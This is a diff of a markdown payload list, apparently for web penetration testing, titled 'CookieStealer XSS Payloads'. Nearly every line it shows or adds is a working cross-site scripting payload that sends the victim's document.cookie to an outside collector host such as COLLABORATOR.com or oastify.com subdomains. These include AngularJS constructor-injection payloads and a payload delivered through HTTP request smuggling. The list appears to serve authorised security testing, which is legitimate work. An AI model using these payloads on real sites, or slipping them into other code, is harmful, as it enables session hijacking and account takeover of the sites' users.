@@ -1,7 +1,7 @@
 
-# CookieStealer-Payloads  
+# CookieStealer XSS Payloads  
 
->Cookie Stealer payloads using Javascript
+>XSS Cookie Stealer payloads using JavaScript
 
 ```Javascript
 JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
@@ -25,23 +25,35 @@ JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
 ${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}
 ```  
 
-![javascript-template-string.png](../images/javascript-template-string.png)  
+![JavaScript template string](../images/javascript-template-string.png)  
+
+>AngularJS DOM XSS Attack **constructor** payloads  
+
+```JavaScript
+{{$on.constructor('alert(1)')()}}
+```
+
+```JavaScript
+{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
+```  
+  
+>HTTP request smuggling to deliver reflected XSS  
+
+```JavaScript
+a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
+```  
 
 >More Cross-Site Scripting (XSS) example cookie stealer payloads.  
 
-```Javascript
+```JavaScript
 <script>
 document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
 </script>
 ```
 
-```Javascript
-a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
-```
-
-```Javascript
+```JavaScript
 document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
-```
+```  
 
 ```Javascript
 document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
